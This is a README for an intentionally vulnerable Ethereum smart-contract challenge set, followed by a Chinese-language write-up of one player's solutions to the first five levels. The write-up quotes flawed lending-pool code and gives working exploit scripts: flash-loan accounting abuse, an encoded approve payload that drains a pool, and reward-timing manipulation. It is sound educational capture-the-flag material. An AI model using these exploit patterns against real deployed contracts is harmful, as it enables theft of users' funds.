![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.

# 解法紀錄

## 1	Unstoppable

- 目標

    讓所有人都不可以執行flashLoan(搞壞他)

- 問題程式
    UnstoppableLender.sol的flashLoan
    
    ```solidity=
    assert(poolBalance == balanceBefore);
    ```
    poolBalance來自於呼叫depositTokens function中才會增加
    
    balanceBefore則是當下合約的token數量
    

    所以只要不透過depositTokens
    
    直接把token打進去合約裡
    
    就不會改變poolBalance
    
    但是能改變balanceBefore
    
    即可以觸發assert

- 前端程式
    ```javascript=
     it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */
            await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        });
    ```


## 2	Naive receiver

- 目標

    receiver的token轉回pool

- 問題程式
    FlashLoanReceiver.sol的receiveEther
    ```solidity=
     uint256 amountToBeRepaid = msg.value + fee;

            require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");

            _executeActionDuringFlashLoan();

            // Return funds to pool
            pool.sendValue(amountToBeRepaid);
    ```
    最後會轉amountToBeRepaid回pool
    
    amountToBeRepaid=msg.value + fee;
    
    fee又等於1 ether (NaiveReceiverLenderPool.sol)

    receiver初始化只有10顆
    
    所以執行10次flashLoan之後
    
    全部的資金就沒了

- 前端程式

    ```javascript=
    it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */   
            for(var i=0;i<10;i++){
                await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther('1'));
            }
        });
    ```
    
    理論上好像執行一次讓msg.value帶9顆也可以
    
    還沒嘗試

## 3	Truster

- 目標

    把Pool所有token轉到attacker

- 問題程式

    TrusterLenderPool.sol的flashLoan

    ```solidity=
     function flashLoan(
            uint256 borrowAmount,
            address borrower,
            address target,
            bytes calldata data
        )
            external
            nonReentrant
        {
            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

            damnValuableToken.transfer(borrower, borrowAmount);
            target.functionCall(data);

            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
    ```
    
    由於這裡沒有驗證任何東西
    
    所以只要把target填token合約
    
    並用data調用approve給attacker
    
    最後直接用transferFrom把錢領走即可


- 前端程式
    
    ```javascript=
        it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE  */
            await this.pool.connect(attacker).flashLoan(0,attacker.address,this.token.address, "0x095ea7b300000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c800000000000000000000000000000000000000000000d3c21bcecceda1000000");
            await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address, TOKENS_IN_POOL);
        });
    ```
    
    由於找不到ethers中怎麼搞出data
    
    這裡的data是由solidity生成
    ```solidity=
     abi.encodeWithSignature("approve(address,uint256)", 0x70997970C51812dc3A010C7d01b50e0d17dc79C8,1000000 ether); 
    ```
## 4	Side entrance
- 目標

    把Pool所有token轉到attacker

- 問題程式

    SideEntranceLenderPool.sol的flashLoan

    ```solidity=
    require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");     
    ```
    最後驗證只看合約的balance
    
    但同時合約又提供了
    
    deposit()跟withdraw()

    於是可以透過flashLoan的execute執行自己合約時
    
    將flashLoan來的token 丟到deposit()
    
    這樣便可以通過flashLoan的驗證
    
    但是也存在新的deposit地址(我的合約)
    
    於是可以在合約中執行withdraw()
    
    把token提出來並且打給題目要求的attacker

- 合約程式

    [SideEntranceLenderPool_test.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/611ff343419e247d5578ed166e8a7f5a735e326e/contracts/side-entrance/SideEntranceLenderPool_test.sol)

- 前端程式

    ```javascript=
        it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */      
            const test = await ethers.getContractFactory('SideEntranceLenderPool_test',attacker);
            const SideEntranceLenderPool_test = await test.deploy(this.pool.address);
            await SideEntranceLenderPool_test.connect(attacker).flashLoan();
        });
    ```

## 5	The rewarder

- 目標
    讓attacker分到最多token(?)

- 問題程式
    TheRewarderPool.sol的distributeRewards()
    ```solidity=
      if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                    rewardToken.mint(msg.sender, rewards);
                    lastRewardTimestamps[msg.sender] = block.timestamp;
                }
    ```
    對於驗證時間_hasRetrievedReward沒有判斷是不是deposit是不過了五天
    所以可以再過了五天後馬上deposit就取得token
    即可以跟上一題一樣flashloan借很多錢丟進去deposit
    然後去call distributeRewards()
    分到token再還flashloan
    轉出給attacker即可

- 合約程式
    [Test.sol](https://github.com/maiaki927/damn-vulnerable-defi-test/blob/611ff343419e247d5578ed166e8a7f5a735e326e/contracts/the-rewarder/Test.sol)

- 前端程式
    ```javascript=
     it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */ 
            await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
            const t = await ethers.getContractFactory('Test', attacker);
            const test = await t.deploy(this.liquidityToken.address,this.rewarderPool.address,this.flashLoanPool.address,this.rewardToken.address);  
            await test.connect(attacker).flashLoan(ethers.utils.parseEther('1000000'));       
        });
    ```
